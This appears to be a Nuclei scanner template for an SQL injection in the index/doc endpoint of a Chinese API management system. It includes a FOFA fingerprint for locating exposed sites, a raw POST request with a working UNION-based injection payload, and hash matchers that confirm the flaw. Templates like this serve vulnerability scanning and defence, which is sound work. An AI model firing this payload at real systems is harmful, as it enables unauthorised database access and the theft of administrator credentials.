id: quanxinyouke-index_doc-sql

info:
  tags: quanxinyouke-index_doc-sql
  name: 全新优客API接口管理系统 index/doc SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="public/static/index/css/flaghome.css"
    全新优客API接口管理系统 index/doc 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。


http:
  - raw:
      - |
        POST /index/index/doc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Content-Type: application/x-www-form-urlencoded

        id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,MD5(123),NULL-- -

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '202cb962ac59075b964b07152d234b70'
      - type: status
        status: 
          - 200



